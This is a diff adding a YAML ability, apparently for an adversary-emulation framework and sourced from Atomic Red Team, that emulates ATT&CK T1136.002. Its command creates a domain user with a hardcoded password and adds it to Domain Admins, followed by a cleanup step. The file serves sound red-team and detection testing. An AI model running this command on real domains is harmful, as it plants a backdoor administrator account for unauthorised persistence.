@@ -1,0 +1,41 @@
+- id: fcec2963-9951-4173-9bfa-98d8b7834e62
+  name: Create a new Windows domain admin user
+  description: Creates a new domain admin user in a command prompt.
+  tactic: persistence
+  technique:
+    attack_id: T1136.002
+    name: 'Create Account: Domain Account'
+  platforms:
+    windows:
+      sh:
+        command: net user "T1136.002_Admin" "T1136_pass123!" /add /domain; net group
+          "Domain Admins" "T1136.002_Admin" /add /domain
+        cleanup: net user "#{username}" >nul 2>&1 /del /domain
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1136.002
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      username:
+        description: Username of the user to create
+        type: string
+        default: T1136.002_Admin
+      password:
+        description: Password of the user to create
+        type: string
+        default: T1136_pass123!
+      group:
+        description: Domain administrator group to which add the user to
+        type: string
+        default: Domain Admins
+    technique_created: '2020-01-28T14:05:17.825Z'
+    atomic_guid: fcec2963-9951-4173-9bfa-98d8b7834e62
+    import_timestamp: '2025-06-24T11:15:05.079090Z'
